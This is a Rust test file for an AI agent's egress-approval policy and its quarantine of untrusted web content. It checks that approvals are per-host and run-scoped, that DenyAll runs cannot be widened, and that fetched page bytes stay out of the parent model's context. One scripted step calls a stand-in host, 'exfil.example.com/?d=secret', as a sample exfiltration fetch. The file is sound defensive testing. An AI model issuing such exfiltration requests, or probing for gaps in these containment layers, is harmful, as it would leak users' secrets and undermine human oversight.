//! **Layer 4 as shipped, measured on the loop rather than read in `egress.rs`.**
//!
//! `EgressPolicy::AllowApproved`'s doc comment says `granted` is *"session-scoped and never
//! persisted: it stops the second fetch of the same host re-asking"*. That sentence describes
//! `grant()`, and `grant()` is a method — a description of a mechanism, not a measurement of
//! its output. This file asks the loop what actually happens.
//!
//! **AND FOR NINETEEN DAYS THE ANSWER WAS "NOTHING".** The first test in this file used to be
//! called `a_second_fetch_of_the_same_host_asks_again_and_the_grant_is_never_recorded`, and it
//! was correct: `EgressPolicy::grant` had no production caller, `CapabilityProfile` exposed no
//! `&mut` route to reach it through, and every fetch of an already-approved host asked again.
//! ADR-032 §3.1 had said otherwise since M2 C2f and was accepted on 2026-08-29; the sentence
//! *"session-scoped grant is what stops the second fetch of the same host re-asking"* described
//! a method nobody called. `SECURITY-AUDIT.md` D11(c) had it as one of eight instance-#16 cases
//! — a declared control with no reader — and nobody had joined it to the ADR it was violating.
//!
//! So the first test is **inverted and renamed**, because a test whose name asserts the opposite
//! of its body is worse than no test:
//!
//! 1. An approved host is **not** asked about again, on any path. A different host still is.
//!    **This is unaffected by layer 1** — condensing a page changes who reads it, not who
//!    approved reaching for it.
//! 2. A run that declared `DenyAll` cannot be widened by an approval, and neither can a run that
//!    declared a fixed `Allow` list. That is the safety property of the whole change and it is
//!    measured by *attempting* the widening rather than by reading `grant`'s doc comment.
//!
//! **The grant is RUN-scoped, and a turn is not a run.** `Daemon::ask_streaming_with` builds a
//! fresh `Run::root` per user message, so the human is asked again on his next turn. That is
//! what ADR-032 §3.1 specifies and it is the same session-versus-run question `SECURITY-AUDIT.md`
//! §8 raises about ADR-023's latch. Neither is extended here.
//!
//! The second test measures **layer 1**, and its assertions were inverted by the routing
//! landing. Recorded here because the before/after is the clearest statement of what changed:
//!
//! | | before layer 1 | after |
//! |---|---|---|
//! | parent's floor after a fetch | `UntrustedContent` | `AgentInferred` |
//! | a composed `bash` target afterwards | refused | allowed, then escalated to a human |
//! | the page's bytes | in the parent's window | in the child's only |
//!
//! **Layer 3 is not relaxed and the test asserts that separately.** The threshold function is
//! untouched; what changed is that the parent no longer crosses it. A run that does reach
//! `UntrustedContent` still loses composed targets, which is asserted directly rather than
//! inferred from the absence of a refusal.
//!
//! None of this reaches the network: the approval decision is recorded before any executor
//! runs, and the host is `ScriptedTools`.
//!
//! **The third test is M3-D4's loop half: egress approval confers no authority on content.** It
//! cannot assert a trust class -- `ScriptedTools` is handed its class by the test, so asserting it
//! back is the double asserting its own constant -- so it asserts the **fate** of the bytes
//! instead, which is what the loop actually decides. Its sibling
//! `marlowe-exec/tests/egress_approval_confers_no_authority.rs` asserts the class itself, on an
//! observed value from the real executor, and cannot see anything the loop does with it.

mod common;

use common::*;
use marlowe_contract::TrustClass;
use marlowe_journal::EventKind;
use marlowe_loop::{
    Budget, CapabilityProfile, Engine, InterruptPolicy, MemoryRecorder, ModelRoute, ModelStep,
    OutputContract, Ports, Provenance, Run, RunId, SessionId, SessionState,
};
use marlowe_permission::{ArgValue, Args, EgressPolicy, Tier, Unavailable};
use marlowe_tools::{ExposedSet, HostPattern, ToolId};

/// A distinctive marker. **Not "a fetched page"** -- a generic body would make the
/// "it is absent from the parent" assertion pass on any build where the wording drifted,
/// which is the vacuous-guard shape. This string appears nowhere else in the workspace.
const PAGE_BODY: &str = "PAGE-BODY-MARKER-7f3a91-must-not-reach-the-parent";

fn engine() -> Engine<Unavailable> {
    Engine::new(
        marlowe_tools::builtin_registry().expect("the eleven builtin manifests load"),
        Unavailable,
        100_000,
        10_000,
        std::path::PathBuf::from("/ws"),
        Tier::Act,
    )
}

fn web_call(url: &str) -> marlowe_loop::ModelCall {
    step(ModelStep::one_call(ToolId::new("web"), Args::new().with("url", ArgValue::Text(url.into()))), 100)
}

fn bash_call(command: &str) -> marlowe_loop::ModelCall {
    step(
        ModelStep::one_call(ToolId::new("bash"), Args::new().with("command", ArgValue::Text(command.into()))),
        100,
    )
}

/// **ADR-032 §3.1, measured on the loop: an approved host is not asked about twice.**
///
/// # This test is the inversion of the one it replaces
///
/// It was `a_second_fetch_of_the_same_host_asks_again_and_the_grant_is_never_recorded`, and it
/// read 3 approvals for 2 hosts. It now reads 2, and that difference is the whole change.
/// Renamed rather than edited in place, because a name asserting the opposite of its body is
/// worse than no test at all.
///
/// # The whole measurement is in ONE run, deliberately
///
/// Every assertion shares one floor, one policy and one script, so the three fetches differ only
/// in the URL. Split across three runs, the "a different host still asks" control would be a
/// different run's policy and could not rule out a grant that leaked.
///
/// # What each of the three possible readings would mean
///
/// | Reading | What it would mean |
/// |---|---|
/// | 3 approvals | no grant is recorded at all — the defect this commit closes |
/// | 1 approval | the grant is not per-host: approving one host opened the second |
/// | **2 approvals** | one per distinct host, which is ADR-032 §3.1 |
///
/// The second fetch is a **different path on the same host** — the user's own scenario, and the
/// reason `grants()` matches on host through `pattern_admits` with the path never entering it.
#[test]
fn an_approved_host_is_not_asked_about_again_and_a_different_host_still_is() {
    let mut e = engine();
    // **The script encodes the CONDENSE COST MODEL, and that model changed (ADR-041).**
    //
    // It used to be one quarantined child per fetch, so each `web_call` was followed by the
    // child's reply. Two things now reduce that, and neither touches what this test measures:
    //
    //   1. a whole group of untrusted results is read by ONE child, and
    //   2. condensed documents are cached by CONTENT hash.
    //
    // `ScriptedTools` returns the same `PAGE_BODY` for every call, so fetches two and three are
    // cache hits and cost **no model call at all**. Only the first fetch needs a child reply.
    //
    // The property under test is untouched: adjudication is per call and happens before any of
    // this, so the approval count is decided by the policy and not by the cache.
    let mut driver = ScriptDriver::new(vec![
        web_call("https://docs.example.com/a"),
        say("the page is about widgets", 50), // the quarantined child's only reply
        // **Same host, different path -- the user's scenario.** Now that the approval above is
        // recorded, this one is `Allowed` outright and emits no `ApprovalRequested`.
        web_call("https://docs.example.com/b"),
        // **The anti-vacuity control, in the same run.** A different host must still ask.
        // Without it, "grant everything on the first yes" passes every other assertion here.
        web_call("https://other.example.com/c"),
        say("done", 100),
    ]);
    let mut summarizer = EmptySummarizer;
    // The fetched page is untrusted content, which is what a real `web` result carries.
    let mut tools = ScriptedTools {
        trust: Some(TrustClass::UntrustedContent),
        body: Some(PAGE_BODY.into()),
        ..Default::default()
    };
    let mut approvals = FixedApprovals(true);
    let mut sink = CollectingSink::default();
    let mut control = marlowe_loop::NoControl;
    let mut clock = FrozenClock(1_700_000_000_000);
    let mut recorder = MemoryRecorder::default();
    let mut ports = Ports {
        escalations: None,
        driver: &mut driver,
        summarizer: &mut summarizer,
        tools: &mut tools,
        memory: None,
        approvals: &mut approvals,
        sink: &mut sink,
        control: &mut control,
        clock: &mut clock,
        recorder: &mut recorder,
    };

    let mut run = Run::root(
        RunId::from_name("egress"),
        SessionId::from_name("egress-session"),
        CapabilityProfile::interactive(),
        Budget::interactive(),
        OutputContract::answer(),
    );
    let mut state = SessionState::new(run.session, "Marlowe.");
    let mut prov = Provenance::new();
    let _ = e.run(&mut run, &mut state, &mut prov, &mut ports);

    // -- 0. the control that keeps every count below from being vacuous ------------------
    //
    // All three fetches must have REACHED THE HOST. A build that silently refused the second
    // and third would also read "2 approvals", and would read it for the opposite reason.
    assert_eq!(
        tools.calls.iter().filter(|(t, _)| t == "web").count(),
        3,
        "three fetches must have executed. Fewer means the calls were refused rather than \
         granted, and every approval count below would be measuring refusals"
    );
    assert_eq!(
        recorder.count(EventKind::EgressBlocked),
        0,
        "under AllowApproved with a `*` declaration, an ungranted host is UNASKED, not denied"
    );

    // -- 1. one approval per DISTINCT host, not one per fetch -----------------------------
    assert_eq!(
        recorder.count(EventKind::ApprovalRequested),
        2,
        "two distinct hosts, two approvals. 3 means no grant was recorded at all -- the defect \
         this test used to be named for. 1 means the grant is not per-host, and approving \
         docs.example.com opened other.example.com"
    );
    assert_eq!(
        recorder.count(EventKind::ApprovalGranted),
        2,
        "the human said yes twice, once per host"
    );

    // -- 2. the policy widened, by exactly those two hosts, in the order they were asked --
    //
    // The structural statement behind the count above. **`docs.example.com` appears ONCE**, so
    // the second fetch of that host neither asked nor re-recorded; and the set holds hosts, not
    // URLs, so neither `/a` nor `/b` is anywhere in it.
    assert_eq!(
        run.profile.egress(),
        &EgressPolicy::AllowApproved {
            granted: vec![
                HostPattern::new("docs.example.com"),
                HostPattern::new("other.example.com"),
            ]
        },
        "the run ends holding exactly the two hosts a human approved. An empty set means \
         `grant_egress_host` was never called; a third entry means a path or a port reached the \
         set; a `*` would mean something widened past what was approved"
    );

    // -- 3. the audit trail names what was widened, and when ------------------------------
    //
    // `ApprovalGranted` used to carry `{}` -- a record that somebody said yes to something. The
    // widening is the part a later reader needs, and it is asserted on the EMITTED payload
    // rather than on the fact that the code builds one.
    let granted = recorder.payloads(EventKind::ApprovalGranted);
    assert_eq!(
        granted.iter().map(|p| p["egress_granted"].clone()).collect::<Vec<_>>(),
        vec![
            serde_json::json!(["docs.example.com"]),
            serde_json::json!(["other.example.com"]),
        ],
        "each approval records the host it widened. `null` here means the journal says a human \
         approved something without saying what the run gained by it"
    );
}

/// **THE SAFETY PROPERTY OF THE WHOLE CHANGE: only `AllowApproved` can accept a widening.**
///
/// `EgressPolicy::grant`'s own doc says why -- *"a `DenyAll` run that could be widened at runtime
/// would make the quarantined reader's containment a matter of what code ran, not of what it
/// declared."* Until this commit that sentence cost nothing, because nothing called `grant`.
/// Now something does, so it is measured.
///
/// # It ATTEMPTS the widening. A test that only watched a blocked fetch would prove nothing
///
/// Under `DenyAll`, `may_ask()` is false, so a `web` call is `Blocked` and the approval branch --
/// where the grant is recorded -- is never reached at all. A test that merely fetched and
/// asserted "blocked" would therefore stay green on a build where `grant` widens `DenyAll`
/// enthusiastically: it never gets there. So the widening is performed **directly, through the
/// only mutable route that exists**, and the loop is then asked whether anything changed.
///
/// # Three policies, because two of them are terminal for different reasons
///
/// `DenyAll` is structural -- the quarantined reader holds it, and §5's narrowing rule depends on
/// it being unwidenable. `Allow { hosts }` is a declaration a run is held to. Neither may grow by
/// approval, and `AllowApproved` is included as the positive control so that the assertions below
/// are not simply "this method does nothing".
#[test]
fn a_deny_all_run_cannot_be_widened_by_an_approval() {
    let host = marlowe_permission::Host::parse("docs.example.com").expect("a plain DNS name");

    // -- the positive control, first: the method DOES widen the one policy that may --------
    //
    // Without this, every assertion below passes on a build where `grant_egress_host` is an
    // empty function -- the exact vacuity this file exists to avoid.
    let mut approvable = profile_with(EgressPolicy::AllowApproved { granted: Vec::new() });
    approvable.grant_egress_host(&host);
    assert_eq!(
        approvable.egress(),
        &EgressPolicy::AllowApproved { granted: vec![HostPattern::new("docs.example.com")] },
        "the one policy that may widen, did. If this fails, nothing below is evidence about \
         anything -- it would only show that the method never works"
    );

    // -- DenyAll: the widening is attempted through the only route there is ----------------
    let mut denied = profile_with(EgressPolicy::DenyAll);
    denied.grant_egress_host(&host);
    assert_eq!(
        denied.egress(),
        &EgressPolicy::DenyAll,
        "a DenyAll run stays DenyAll. `grant` is a no-op on every variant but AllowApproved, and \
         that is what keeps the quarantined reader's containment a property of what it DECLARED \
         rather than of what code happened to run"
    );

    // -- ...and the quarantined reader itself, which is the run that reading matters for ---
    //
    // `CapabilityProfile::new` refuses `reads_untrusted` with anything but `DenyAll`
    // (`QuarantineWithEgress`). This asserts that the one mutable route on the type cannot get
    // behind that check -- which is the reason the granted set lives on the profile at all.
    let mut reader = CapabilityProfile::quarantined_reader();
    reader.grant_egress_host(&host);
    assert_eq!(
        reader.egress(),
        &EgressPolicy::DenyAll,
        "the quarantined reader's egress is an invariant its constructor enforces, and the one \
         mutable route on this type cannot get behind it"
    );

    // -- a declared Allow list is held to its list -----------------------------------------
    let mut declared = profile_with(EgressPolicy::allow(&["api.example.com"]));
    declared.grant_egress_host(&host);
    assert_eq!(
        declared.egress(),
        &EgressPolicy::allow(&["api.example.com"]),
        "a run that named its hosts in advance cannot ask its way past its own list"
    );

    // -- and now the observed outcome through the loop, on the widened DenyAll run ---------
    //
    // The comparisons above are structural. This is the fate of the call: a run whose `DenyAll`
    // policy has had `grant_egress_host` called on it still cannot reach the host, is never
    // asked about it, and records the refusal.
    let mut e = engine();
    let mut driver = ScriptDriver::new(vec![
        web_call("https://docs.example.com/a"),
        web_call("https://docs.example.com/b"),
        say("done", 100),
    ]);
    let mut summarizer = EmptySummarizer;
    let mut tools = ScriptedTools {
        trust: Some(TrustClass::UntrustedContent),
        body: Some(PAGE_BODY.into()),
        ..Default::default()
    };
    // **The human says yes to everything.** If an approval could widen this run, it would.
    let mut approvals = FixedApprovals(true);
    let mut sink = CollectingSink::default();
    let mut control = marlowe_loop::NoControl;
    let mut clock = FrozenClock(1_700_000_000_000);
    let mut recorder = MemoryRecorder::default();
    let mut ports = Ports {
        escalations: None,
        driver: &mut driver,
        summarizer: &mut summarizer,
        tools: &mut tools,
        memory: None,
        approvals: &mut approvals,
        sink: &mut sink,
        control: &mut control,
        clock: &mut clock,
        recorder: &mut recorder,
    };

    let mut run = Run::root(
        RunId::from_name("deny-all"),
        SessionId::from_name("deny-all-session"),
        denied,
        Budget::interactive(),
        OutputContract::answer(),
    );
    let mut state = SessionState::new(run.session, "Marlowe.");
    let mut prov = Provenance::new();
    let _ = e.run(&mut run, &mut state, &mut prov, &mut ports);

    assert_eq!(
        recorder.count(EventKind::EgressBlocked),
        2,
        "both fetches were refused at the boundary. Under DenyAll an ungranted host is DENIED, \
         not unasked -- `may_ask()` is false, which is the difference between the two policies"
    );
    assert_eq!(
        recorder.count(EventKind::ApprovalRequested),
        0,
        "nobody was asked. A reading above zero would mean DenyAll had become a question, which \
         is exactly what ADR-032 §2 says it must never be"
    );
    assert_eq!(
        tools.calls.iter().filter(|(t, _)| t == "web").count(),
        0,
        "and no fetch reached the host"
    );
    assert_eq!(
        run.profile.egress(),
        &EgressPolicy::DenyAll,
        "the run ends as it started. Reading `AllowApproved` here would mean the loop had \
         widened it, and the containment argument would be gone"
    );
}

/// **Layer 1, end to end.** Two pages fetched, neither in the parent, and a composed `bash`
/// target still allowed afterwards. One run, so the floor is not a variable.
#[test]
fn after_a_fetch_the_parents_floor_is_untouched_and_a_composed_target_still_runs() {
    let mut e = engine();
    // See the cost-model note on the test above: identical bodies mean the second fetch is a
    // cache hit and needs no child reply of its own.
    let mut driver = ScriptDriver::new(vec![
        web_call("https://docs.example.com/page"),
        say("the page is about widgets", 50), // the quarantined child's only reply
        // Layer 3's question: a model-composed Target at UntrustedContent.
        // `web` is Inert  -> target check skipped  -> approvable.
        web_call("https://exfil.example.com/?d=secret"),
        // `bash`'s composed `command`. Before layer 1 this was refused, because the fetched page
        // had dropped THIS run's floor to UntrustedContent. It is now allowed, and the change is
        // the point of the whole exercise -- see the assertions.
        bash_call("echo hello"),
        say("done", 100),
    ]);
    let mut summarizer = EmptySummarizer;
    let mut tools = ScriptedTools {
        trust: Some(TrustClass::UntrustedContent),
        body: Some(PAGE_BODY.into()),
        ..Default::default()
    };
    let mut approvals = FixedApprovals(true);
    let mut sink = CollectingSink::default();
    let mut control = marlowe_loop::NoControl;
    let mut clock = FrozenClock(1_700_000_000_000);
    let mut recorder = MemoryRecorder::default();
    let mut ports = Ports {
        escalations: None,
        driver: &mut driver,
        summarizer: &mut summarizer,
        tools: &mut tools,
        memory: None,
        approvals: &mut approvals,
        sink: &mut sink,
        control: &mut control,
        clock: &mut clock,
        recorder: &mut recorder,
    };

    let mut run = Run::root(
        RunId::from_name("differential"),
        SessionId::from_name("differential-session"),
        CapabilityProfile::interactive(),
        Budget::interactive(),
        OutputContract::answer(),
    );
    let mut state = SessionState::new(run.session, "Marlowe.");
    let mut prov = Provenance::new();
    let _ = e.run(&mut run, &mut state, &mut prov, &mut ports);

    // ── the property layer 1 exists for ────────────────────────────────────────────────
    //
    // **The parent's floor never moved.** Two pages were fetched and neither entered this
    // window: each was read by a quarantined child and came back as a validated summary at
    // `AgentInferred`. Before the routing this assertion read `UntrustedContent`.
    assert_eq!(
        run.trust_floor(),
        TrustClass::AgentInferred,
        "the parent must not be tainted by content it never saw. `AgentObserved` would mean the \
         page reached this window; `UntrustedContent` would mean the routing did not happen"
    );

    // Both fetches ran.
    let web_calls = tools.calls.iter().filter(|(t, _)| t == "web").count();
    assert_eq!(web_calls, 2, "both fetches executed");

    // ── §8.2's second sentence, as an assertion rather than an observation ──────────────
    //
    // *"The component with tool access receives sanitized structured input, never raw untrusted
    // text."* The floor assertion above says the parent was not TAINTED; this says the bytes are
    // not THERE, which is the requirement. They are different claims and only one of them is what
    // the brief asks for -- a build that latched correctly while still inlining the page would
    // satisfy the first and fail this.
    let rendered = e.assembler().assemble(&state).rendered();
    assert!(
        !rendered.contains(PAGE_BODY),
        "the page's own bytes must not appear in the parent's window:\n{rendered}"
    );
    // ...and the negative control: the child DID see them, so the absence above is containment
    // rather than a fetch that never happened or a body that was always empty.
    assert!(
        driver.views_seen.iter().any(|v| v.contains(PAGE_BODY)),
        "some view must have contained the page, or this test proves nothing about where it went"
    );
    // What crossed instead is the condensed form, under the contract's field name.
    assert!(
        // `source_1:` rather than `findings:` since ADR-041: the contract gained one field per
        // source so that one reader can describe several documents without merging them.
        rendered.contains("read under quarantine") && rendered.contains("source_1:"),
        "the parent received the validated summary: {rendered}"
    );

    // **`bash` now runs, and this is the change.** Its `command` is model-composed, so before
    // layer 1 it was refused for the rest of any run that had fetched anything -- the guard
    // compensating for the missing control, reported by the human as "after fetching web data
    // all his tools get turned off. seems dumb". The read was right and this is the fix: the
    // thing that read the page cannot act, and the thing that acts never read it.
    let bash_calls = tools.calls.iter().filter(|(t, _)| t == "bash").count();
    assert_eq!(
        bash_calls, 1,
        "with the page condensed away, the parent's floor is clean and a composed Target is \
         allowed again"
    );

    // **The control, and it is what stops this reading as a relaxation of layer 3.** Layer 3 is
    // untouched: `blocks_composed_targets` still refuses at `<= UntrustedContent`, and a run
    // whose floor DOES reach the bottom still loses composed targets. What changed is that this
    // run's floor no longer gets there, because the page is no longer in it. The refusal is
    // asserted directly, on the same threshold function the adjudicator enforces on.
    assert!(
        !marlowe_permission::blocks_composed_targets(run.trust_floor()),
        "this run is above the blocking threshold"
    );
    assert!(
        marlowe_permission::blocks_composed_targets(TrustClass::UntrustedContent),
        "...and the threshold itself is unchanged: a run that DID reach UntrustedContent would \
         still be refused. Layer 1 keeps the parent above the line; it does not move the line"
    );

    // **Three, not two, and the third one matters.** `bash` passed the target check -- that is
    // the change above -- and then hit §9's unconditional escalation for `Irreversible`, so it
    // still asked a human. Layer 1 returns the composed target to the model; it does not return
    // it unsupervised. A reading of 2 here would mean `bash` ran without asking, which would be
    // a real regression and is what this number is here to catch.
    assert_eq!(
        recorder.count(EventKind::ApprovalRequested),
        3,
        "two fetches and one bash. `bash` is Irreversible and escalates whatever the tier says"
    );
}

// ══════════════════════════════════════════════════════════════════════════════════════════
// M3-D4 — approval is reachability, not authority. The loop half.
// ══════════════════════════════════════════════════════════════════════════════════════════

/// A host reached by APPROVAL and the same host reached by GRANT, side by side.
const APPROVED_HOST: &str = "docs.example.com";
const APPROVED_URL: &str = "https://docs.example.com/approved";

/// What one arm observed. Collected into a struct so the two arms are compared field by field
/// rather than by two blocks of assertions that could quietly drift apart.
struct Arm {
    approvals_requested: usize,
    approvals_granted: usize,
    floor: TrustClass,
    /// The parent's rendered window at the end of the run.
    rendered: String,
    /// Whether ANY view the driver was called with contained the page — the child's included.
    some_view_saw_the_page: bool,
    web_calls: usize,
}

/// One fetch of `APPROVED_URL`, under whatever profile the caller hands in.
///
/// The script and every other port are identical between arms **by construction**: the profile is
/// the only parameter, so any difference in the numbers below is a difference the profile caused.
fn one_fetch_under(profile: CapabilityProfile) -> Arm {
    let mut e = engine();
    let mut driver = ScriptDriver::new(vec![
        web_call(APPROVED_URL),
        say("the page is about widgets", 50), // the quarantined child's only reply
        say("done", 100),
    ]);
    let mut summarizer = EmptySummarizer;
    let mut tools = ScriptedTools {
        trust: Some(TrustClass::UntrustedContent),
        body: Some(PAGE_BODY.into()),
        ..Default::default()
    };
    let mut approvals = FixedApprovals(true);
    let mut sink = CollectingSink::default();
    let mut control = marlowe_loop::NoControl;
    let mut clock = FrozenClock(1_700_000_000_000);
    let mut recorder = MemoryRecorder::default();
    let mut ports = Ports {
        escalations: None,
        driver: &mut driver,
        summarizer: &mut summarizer,
        tools: &mut tools,
        memory: None,
        approvals: &mut approvals,
        sink: &mut sink,
        control: &mut control,
        clock: &mut clock,
        recorder: &mut recorder,
    };

    let mut run = Run::root(
        RunId::from_name("authority"),
        SessionId::from_name("authority-session"),
        profile,
        Budget::interactive(),
        OutputContract::answer(),
    );
    let mut state = SessionState::new(run.session, "Marlowe.");
    let mut prov = Provenance::new();
    let _ = e.run(&mut run, &mut state, &mut prov, &mut ports);

    Arm {
        approvals_requested: recorder.count(EventKind::ApprovalRequested),
        approvals_granted: recorder.count(EventKind::ApprovalGranted),
        floor: run.trust_floor(),
        rendered: e.assembler().assemble(&state).rendered(),
        some_view_saw_the_page: driver.views_seen.iter().any(|v| v.contains(PAGE_BODY)),
        web_calls: tools.calls.iter().filter(|(t, _)| t == "web").count(),
    }
}

/// **Both arms are built here, and the egress policy is the ONLY thing that varies.**
///
/// It was two separate constructors — `CapabilityProfile::interactive()` against a hand-built
/// one — and a hostile review measured that they differed in **three** ways, not one: twelve
/// exposed tools against two, `may_write_memory` true against false, and the grant. Only the
/// third is the intended variable. The test still passed, so this was a diagnostic defect rather
/// than a wrong result — but the differential assertion at the bottom says the arms "differ in
/// HOW the host was reached and in nothing else", and on that code it was false. A disagreement
/// could have been caused by the exposed set or the memory-write flag, and the message would
/// have named the wrong culprit.
///
/// One constructor makes the claim true by construction. Arm A's realism is preserved on the axis
/// that matters: `AllowApproved { granted: [] }` is exactly what `CapabilityProfile::interactive`
/// carries (`profile.rs`, ADR-032 §3.1), so arm A is the shipped egress posture even though its
/// tool set is trimmed to what this script calls.
fn profile_with(egress: EgressPolicy) -> CapabilityProfile {
    CapabilityProfile::new(
        ExposedSet::new(vec![ToolId::new("web"), ToolId::new("bash")]).expect("two fits"),
        egress,
        InterruptPolicy::Interruptible,
        ModelRoute::Orchestrator,
        marlowe_loop::AgentLevel::Secretary,
        false,
        false,
    )
    .expect("this profile reads nothing untrusted")
}

/// **The egress posture a run can actually reach today**: `AllowApproved` with an empty set,
/// widened by nothing, with a human saying yes at the gate.
fn reachable_profile() -> CapabilityProfile {
    profile_with(EgressPolicy::AllowApproved { granted: Vec::new() })
}

/// **A run that already holds the grant**, written out rather than earned.
///
/// This doc used to read *"a policy no run can reach ... `EgressPolicy::grant` has no production
/// caller"*, and that is **no longer true**: the loop records the grant on approval, so this state
/// is now exactly what the run in `an_approved_host_is_not_asked_about_again_...` is in after its
/// first `yes`. Corrected in the same commit that made it false, because a stale "unreachable"
/// note invites a reader to dismiss this arm as hypothetical when it is now the common case.
///
/// It is still **constructed** rather than earned, and that is deliberate: the two arms must
/// differ in one thing only — whether anybody was asked — and earning it would add an approval to
/// arm B, which is the very observable the differential is measuring.
fn constructed_grant_profile() -> CapabilityProfile {
    profile_with(EgressPolicy::AllowApproved { granted: vec![HostPattern::new(APPROVED_HOST)] })
}

/// **Egress approval confers no authority on what the host returns — measured on the loop.**
///
/// # What it asserts, and why it is not a class assertion
///
/// The class a `marlowe-loop` test sees is the one the test set: `ScriptedTools` returns
/// `self.trust`. Asserting it back would be the double asserting its own constant, which is the
/// green-and-vacuous shape this project keeps logging. What the LOOP decides is the **fate** of
/// the bytes — `blocks_composed_targets(outcome.trust)` routes them to a quarantined child — so
/// containment is the honest loop-level read, and the class itself is asserted in
/// `marlowe-exec/tests/egress_approval_confers_no_authority.rs` on a value the real executor
/// produced. Neither file can see the other's mutation.
///
/// # The two arms and the differential
///
/// Arm A reaches the host the way the shipped product does: an ungranted `AllowApproved` policy
/// and a human at the gate. Arm B reaches it by a grant held in advance. **They must differ in
/// exactly one observable — whether anybody was asked — and agree on everything about the bytes.**
/// The wrong version is one where reaching a host more easily also treats what it returns more
/// kindly, and that shows up as arm B disagreeing with arm A about containment.
///
/// # What the scripted `web` stands in for
///
/// Since ADR-042 the shipped `web` returns a `DocumentRef` at `AgentObserved` and never page
/// content; the untrusted bytes re-enter on a later `read(ref=...)`, which declares no `Url`
/// parameter and is therefore never egress-adjudicated at all. The scripted `web` here carries
/// the page directly, so it stands in for **whatever tool result carries the bytes** rather than
/// modelling the shipped fetch. What is measured is that the egress policy does not change the
/// ROUTING of an untrusted result, whichever call produced it — which is the property, and it
/// is tool-agnostic because `condense_batch` triggers on the trust class rather than the tool
/// name. The sibling exec test covers the real `web`/`read` split.
///
/// # The controls
///
/// - **The approval genuinely happened** (arm A): one `ApprovalRequested` and one
///   `ApprovalGranted`. Without it the arm could be measuring a host nobody was asked about.
/// - **The grant genuinely took effect** (arm B): zero `ApprovalRequested`. That is the only
///   observable difference a grant makes, so without it arm B is arm A with extra words.
/// - **The fetch genuinely occurred** (both): one `web` call reached the host.
/// - **The page genuinely carried the marker** (both): some view contained `PAGE_BODY`, so the
///   parent's not containing it is containment rather than a body that was always empty.
#[test]
fn approving_a_host_does_not_change_what_the_loop_does_with_what_it_returns() {
    let approved = one_fetch_under(reachable_profile());
    let granted = one_fetch_under(constructed_grant_profile());

    // ── the two controls that distinguish the arms ───────────────────────────────────────
    assert_eq!(
        (approved.approvals_requested, approved.approvals_granted),
        (1, 1),
        "arm A: a human was actually asked and actually said yes. Zero here would mean the host \
         was reached without an approval, and the arm would be measuring nothing"
    );
    assert_eq!(
        granted.approvals_requested, 0,
        "arm B: the grant took effect — a granted host is not asked about. A reading of 1 means \
         the constructed policy did nothing and this arm is a duplicate of arm A"
    );

    // ── and the control that a fetch happened at all, in both ────────────────────────────
    for (name, arm) in [("approved", &approved), ("granted", &granted)] {
        assert_eq!(arm.web_calls, 1, "{name}: the fetch reached the host");
        assert!(
            arm.some_view_saw_the_page,
            "{name}: some view must have contained the page, or every absence below is vacuous"
        );
    }

    // ── THE PROPERTY: the two arms agree about the bytes ─────────────────────────────────
    //
    // Approval widened WHAT COULD BE REACHED. It did not widen what may be believed about what
    // came back, and it did not exempt the reply from the quarantined reader.
    for (name, arm) in [("approved", &approved), ("granted", &granted)] {
        assert!(
            !arm.rendered.contains(PAGE_BODY),
            "{name}: an approved host's bytes must not reach the parent's window either. §8.2's \
             second sentence does not have a friends list:\n{}",
            arm.rendered
        );
        assert!(
            arm.rendered.contains("read under quarantine") && arm.rendered.contains("source_1:"),
            "{name}: what crossed instead is the validated summary:\n{}",
            arm.rendered
        );
        assert_eq!(
            arm.floor,
            TrustClass::AgentInferred,
            "{name}: `UntrustedContent` here would mean the condensed-summary routing did \
             not happen and the page tainted the parent. It is evidence ONLY in that \
             direction: `AgentInferred` is the floor of every run that reaches a model turn \
             — every History block is stamped `AgentInferred` (context.rs) and \
             `trust_floor` is a `min` — so no value above it is reachable here and this \
             assertion cannot detect one. Read it together with the containment assertions \
             above, not on its own"
        );
    }

    // ── stated as the differential, so a change that breaks the symmetry is named ────────
    assert_eq!(
        (approved.floor, approved.rendered.contains(PAGE_BODY)),
        (granted.floor, granted.rendered.contains(PAGE_BODY)),
        "the two arms differ in HOW the host was reached and in nothing else. If they ever \
         disagree here, something has made approval confer authority"
    );
}
